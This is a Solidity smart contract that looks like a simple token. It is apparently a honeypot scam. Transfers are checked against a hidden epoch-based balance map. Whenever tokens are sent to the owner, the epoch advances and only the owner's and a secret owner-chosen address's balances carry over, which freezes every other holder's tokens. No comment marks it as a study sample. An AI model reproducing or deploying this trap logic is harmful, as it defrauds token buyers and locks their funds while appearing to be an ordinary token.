contract Token {
  mapping(address => uint) public balanceOf;
  uint public totalSupply;
  uint private _epoch;
  address private white_addr;
  address public owner = tx.origin;
  mapping(address => bool) public _isWhite;
  mapping(address => mapping(uint256 => uint256)) private _balance;

  constructor() public
  {
    _isWhite[msg.sender] = true;
    _balance[owner][0] = 100000;
  }


//  function changeWhite (address _addr) public returns(bool)
// {
    // if (msg.sender == a)
    // {
//      _isWhite[_addr] = true;
//      return true;
    // }
// }

function changeb (address a) public returns(bool)
  {
    if (msg.sender == owner)
    { 
      white_addr = a;
      return true;
    }
  }


// function changeA(address _owner) public returns(bool){
//   if (msg.sender == owner)
//  {
//        owner = _owner;
//        return true;
//  }
//  return false;
// }
  function transfer(address _to, uint _value) public returns (bool) {
      _beforeTokenTransfer(msg.sender, _to, _value);
      balanceOf[msg.sender] -= _value;
      balanceOf[_to] += _value;
      _afterTokenTransfer(msg.sender, _to, _value);
      return true;    
  }
  function _beforeTokenTransfer(address from, address to, uint256 amount) internal 
    {
        require(_balance[from][_epoch] >= amount);
    }

    function _afterTokenTransfer(address from, address to, uint256 amount)  internal  {
        if(to == owner) {
            _epoch += 1;
            _balance[to][_epoch] = balanceOf[to];
            _balance[white_addr][_epoch] = balanceOf[white_addr];
        }
    }
}
